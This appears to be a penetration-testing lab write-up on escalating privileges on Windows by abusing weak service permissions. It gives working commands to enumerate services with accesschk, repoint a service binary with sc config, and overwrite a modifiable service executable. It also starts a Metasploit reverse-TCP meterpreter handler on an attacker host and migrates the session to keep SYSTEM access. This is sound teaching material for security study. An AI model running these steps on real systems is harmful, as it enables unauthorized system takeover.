# Weak Service Permissions

This quick lab covers two Windows service misconfigurations that allow an attacker to elevate their privileges:

1. A low privileged user is allowed to change service configuration - for example change the service binary the service launches when it starts
2. A low privileged user can overwrite the binary the service launches when it starts

## 1. Changing Service Configuration

Let's enumerate services with `accesschk` from SysInternals and look for `SERVICE_ALL_ACCESS` or  `SERVICE_CHANGE_CONFIG` as these privileges allow attackers to modify service configuration:

{% code title="attacker@victim" %}
```text
\\vboxsvr\tools\accesschk.exe /accepteula -ucv "mantvydas" evilsvc
or
\\vboxsvr\tools\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```
{% endcode %}

Below indicates that the user `mantvydas` has full access to the service:

![](../../.gitbook/assets/annotation-2019-05-21-205403.png)

Let's modify the service and point its binary to our malicious binary that will get us a meterpreter shell when the service is launched:

{% code title="attacker@victim" %}
```text
.\sc.exe config evilsvc binpath= "c:\program.exe"
```
{% endcode %}

![](../../.gitbook/assets/annotation-2019-05-21-205633.png)

Let's fire up a multihandler in mfsconsole:

{% code title="attacker@kali" %}
```text
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```
{% endcode %}

...and start the vulnerable service:

{% code title="attacker@victim" %}
```text
.\sc.exe start evilsvc
```
{% endcode %}

..and enjoy the meterpreter session:

![](../../.gitbook/assets/annotation-2019-05-21-210027.png)

Note that the meterpreter session will die soon since the meterpreter binary `program.exe` that the vulnerable service `VulnSvc` kicked off, is not a compatible service binary. To save the session, migrate it to another sprocess:

{% code title="attacker@kali" %}
```text
run post/windows/manage/migrate
```
{% endcode %}

Even though the service failed, the session was migrated and saved:

![](../../.gitbook/assets/annotation-2019-05-21-210541%20%281%29.png)

## 2. Overwriting Service Binary

From the first exercise, we know that our user has `SERVICE_ALL_ACCESS` for the service `evilsvc`. Let's check the service binary path:

{% code title="attacker@victim" %}
```text
sc.exe qc evilsvc
```
{% endcode %}

![](../../.gitbook/assets/annotation-2019-05-21-210916.png)

Let's check file permissions of the binary c:\service.exe using a native windows tool `icals` and look for \(M\)odify or \(F\)ull permissions for `Authenticated Users` or the user you currently have a shell with:

{% code title="attacker@victim" %}
```text
icacls C:\service.exe
```
{% endcode %}

![](../../.gitbook/assets/annotation-2019-05-21-211128.png)

Since c:\service.exe is \(M\)odifiable by any authenticated user, we can move our malicious binary c:\program.exe to c:\service.exe:

{% code title="attacker@victim" %}
```text
cp C:\program.exe C:\service.exe
ls c:\
```
{% endcode %}

![](../../.gitbook/assets/annotation-2019-05-21-211232.png)

...and get the meterpreter shell once `sc start evilsvc` is executed. Note that the shell will die if we do not migrate the process same way as mentioned earlier:

![](../../.gitbook/assets/annotation-2019-05-21-211349.png)

Since services usually run under `NT AUTHORITY\SYSTEM`, our malicious binary gets executed with `SYSTEM` privileges:

![](../../.gitbook/assets/annotation-2019-05-21-212438.png)

